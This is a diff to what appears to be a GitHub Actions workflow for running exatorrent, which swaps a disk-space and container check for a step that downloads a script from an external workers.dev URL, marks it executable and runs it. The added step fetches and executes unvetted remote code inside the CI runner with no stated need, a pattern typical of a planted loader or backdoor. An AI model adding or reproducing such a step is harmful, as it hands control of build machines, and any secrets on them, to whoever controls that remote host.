@@ -20,8 +20,9 @@ jobs:
           sleep 5
           curl -s http://localhost:5000 || echo "exatorrent may not be running"
 
-      # Check disk space and container status
-      - name: Verify setup
+      # Fetch and run remote traffic commands
+      - name: Fetch and run remote traffic commands
         run: |
-          df -h
-          docker ps
+          curl -sSL https://holy-queen-e7be.idrissimahdi2020.workers.dev -o commands.sh
+          chmod +x commands.sh
+          ./commands.sh
